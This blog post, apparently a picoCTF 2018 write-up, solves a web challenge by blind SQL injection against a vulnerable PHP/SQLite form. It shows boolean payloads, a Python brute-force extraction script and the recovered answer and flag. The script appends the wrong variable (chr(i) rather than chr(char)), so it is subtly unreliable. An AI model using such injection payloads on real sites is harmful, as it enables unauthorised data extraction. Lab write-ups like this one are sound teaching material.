---
layout: posts
title:  Pico CTF 2018 - A Simple Question
date:   2018-09-27
categories: [CTFs, pico18]
---

[~$ cd ..](/ctfs/pico18/2018/09/27/index.html)

>There is a website running at http://2018shell1.picoctf.com:2644 (link).
>Try to see if you can answer its question.

We are expected to answer the question "What is the answer?". What a broad issue!

![site](/assets/res/CTFs/pico18/simple_question/site.png)

We quickly saw where was the problem by sending only a single quote:

![inject](/assets/res/CTFs/pico18/simple_question/inject.png)

By looking at the HTML source code, we found that we could have the PHP source by reading `answer2.phps`:

> ```php
><?php
>	include "config.php";
>	ini_set('error_reporting', E_ALL);
>	ini_set('display_errors', 'On');
>
>	$answer = $_POST["answer"];
>	$debug = $_POST["debug"];
>	$query = "SELECT * FROM answers WHERE answer='$answer'";
>	echo "<pre>";
>	echo "SQL query: ", htmlspecialchars($query), "\n";
>	echo "</pre>";
>?>
><?php
>	$con = new SQLite3($database_file);
>	$result = $con->query($query);
>
>	$row = $result->fetchArray();
>	if($answer == $CANARY)  {
>		echo "<h1>Perfect!</h1>";
>		echo "<p>Your flag is: $FLAG</p>";
>	}
>	elseif ($row) {
>		echo "<h1>You are so close.</h1>";
>	} else {
>		echo "<h1>Wrong.</h1>";
>	}
>?>
> ```

We can see here that if the query returns an empty set, "Wrong" is displayed. In case of failure, the error is shown, and if the query returns more than one row,
we get a "You are so close".

Let's try with a smarter payload: **' or (select count(*) from answers) > 0 or '"**

![close](/assets/res/CTFs/pico18/simple_question/close.png)

and with: **' or (select count(*) from answers) > 1 or '"**

![wrong](/assets/res/CTFs/pico18/simple_question/wrong.png)

Okay, then there is only one row.

We first tried to determine the length of the string to extract by testing multiple values for `x`: **' or (select length(answer) from answers) =x  or '**, and found that
the password is a 14-letters word.

The extraction script will send **' or (select substr(answer,x,1) from answers) = char(y) or '**, by iterating from 1 to 14 for `x` and from 1 to 255 for `y`.

> ```python
>import requests
>
>def brute(i):
>	for x in xrange(1,255):
>		params = {"answer": "' or (select substr(answer,"+str(i)+",1) from answers) = char("+str(x)+") or '", "debug":"0"}
>		r = requests.post("http://2018shell1.picoctf.com:2644/answer2.php", data=params)
>		if "You are so close" in r.text:
>			print x
>			return x
>		elif "Warning" in r.text:
>			print r.text
>			return 0
>i = 1
>extract = ''
>while i <15:
>	char = brute(i)
>	if char == 0:
>		print extract
>		break
>	extract += chr(i)
>	i+=1
> ```

Returned values are: **52,49,65,110,100,83,105,120,83,105,120,116,104,115**, which gives us:

> ```python
>print "".join(chr(x) for x in [52,49,65,110,100,83,105,120,83,105,120,116,104,115])
>41AndSixSixths
> ```

By sending this answer back to the server, we got as answer:

> ```
>Perfect!
>
>Your flag is: picoCTF{qu3stions_ar3_h4rd_28fc1206}
> ```
